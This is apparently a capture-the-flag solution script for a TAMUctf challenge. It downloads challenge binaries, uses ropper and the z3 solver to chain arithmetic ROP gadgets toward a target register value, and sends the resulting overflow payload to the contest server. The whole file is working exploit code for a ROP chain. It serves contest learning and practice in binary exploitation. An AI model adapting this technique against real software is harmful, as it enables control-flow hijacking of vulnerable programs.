from z3 import *
from random import randint, choice, shuffle
from pwn import *
import re

set_param('parallel.enable', True)

MAX_NUM = 0xffff
ARITH_STEP_LENGTH = 10

r = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")
for i in range(5):
	instructions =  r.recvline().decode()
	target = int(re.search("call print\(\) with rax = (.*)",instructions).group(1),16)
	with open(f"binary{i}","wb") as f:
		f.write(bytes.fromhex(r.recvline().rstrip().decode()))
	exe = ELF(f"binary{i}")
	print(hex(target))

	def chunks(lst, n):
	   """Yield successive n-sized chunks from lst."""
	   for i in range(0, len(lst), n):
	       yield lst[i:i + n]


	with process(["ropper", "-f", f"binary{i}", "--nocolor", "--search", "lea"]) as ropper:
		gadgets = ropper.recvall().decode()
		found_arith_gadgets = []
		start_addr = 0x401004
		start = u16(exe.read(0x00401007, 2))
		constants = [u16(x) for x in chunks(exe.read(exe.symbols['constants'], 2*160),2)]
		for line in gadgets.split("\n"):
			gadget = re.search("(0x[0-9a-fA-F]+): lea rbx, \[(0x[0-9a-fA-F]+)\]; ([a-z]+) ax, word ptr \[rbx\]; ret;", line)
			if gadget:
				addr, rhs, op = (int(gadget.group(1),16), int(gadget.group(2),16), gadget.group(3).upper())
				rhs = constants[(rhs - exe.symbols['constants'])//2]
				found_arith_gadgets.append((addr, op, rhs))

	op_map = {
		"ADD": lambda x, y: (x + y) & MAX_NUM,
		"SUB": lambda x, y: (x - y) & MAX_NUM,
		"XOR": lambda x, y: (x ^ y) & MAX_NUM,
	}

	op_num_map = {
		"ADD": 0,
		"SUB": 1,
		"XOR": 2,
	}

	op_addr_map = {(b,c): a for a,b,c in found_arith_gadgets}

	operations = [(b,c) for a,b,c in found_arith_gadgets]

	operations = [(op_map[op],op_num_map[op], rhs) for op, rhs in operations]

	print(f'starting gadget {hex(start)}, target is {hex(target)}')

	s = Solver()

	vals =  [BitVec(f'vals{i}',64) for i in range(ARITH_STEP_LENGTH)]# + [BitVec('target',64)]
	ops = [Int(f'ops{i}') for i in range(ARITH_STEP_LENGTH)]
	operands = [Int(f'operands{i}') for i in range(ARITH_STEP_LENGTH)]
	start = BitVecVal(start,64)
	target = BitVecVal(target,64)


	s.add(Or([And(operands[0] == rhs, ops[0] == op_int, op(start, rhs) == vals[0]) for op, op_int, rhs in operations]))

	for i in range(ARITH_STEP_LENGTH-1):
		s.add(Or([And(operands[i+1] == rhs, ops[i+1] == op_int, op(vals[i], rhs) == vals[i+1]) for op, op_int, rhs in operations]))

	s.add(vals[-1] == target)

	num_op_map = {
		0: "ADD",
		1: "SUB",
		2: "XOR"
	}

	if s.check() == sat:
		model = s.model()
		payload = b"A" * 8 + p64(0x401004)
		for i in range(ARITH_STEP_LENGTH):
			payload += p64(op_addr_map[(num_op_map[model[ops[i]].as_long()], model[operands[i]].as_long())])
			print(f"{num_op_map[model[ops[i]].as_long()]} {hex(model[operands[i]].as_long())} -> {hex(model[vals[i]].as_long())}")
		payload += p64(exe.symbols['print'])
		r.sendline(payload.hex())
	else:
		print("unsat :(1")
print(r.recvall())
